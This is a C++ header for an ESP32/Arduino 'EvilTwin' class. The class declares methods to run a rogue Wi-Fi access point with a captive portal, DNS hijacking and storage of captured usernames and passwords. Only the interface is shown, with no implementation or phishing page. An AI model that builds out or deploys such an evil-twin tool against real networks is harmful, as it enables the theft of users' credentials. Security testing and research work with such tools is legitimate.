#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <Preferences.h>

class EvilTwin {
public:
  EvilTwin();
  ~EvilTwin();

  void start(const char* ssid, uint8_t channel, const char* password = "");
  void stop();
  bool isRunning() const { return _running; }
  int  getCaptureCount() const { return _captureCount; }
  String getLastCapture() const { return _lastCapture; }
  int  getClientCount();

  // NVS credential management
  void loadCaptures();
  int  getStoredCaptureCount();
  String getStoredCapture(int index);
  void clearCaptures();

private:
  bool _running;
  int  _captureCount;
  String _lastCapture;
  char _ssid[33];

  DNSServer _dnsServer;
  AsyncWebServer* _server;
  TaskHandle_t _dnsTaskHandle;

  static void _dnsTaskFunc(void* param);
  void _saveCapture(const String& ssid, const String& user, const String& pass);

  static const char CAPTIVE_HTML[] PROGMEM;
  static const char THANKS_HTML[] PROGMEM;
};

#endif
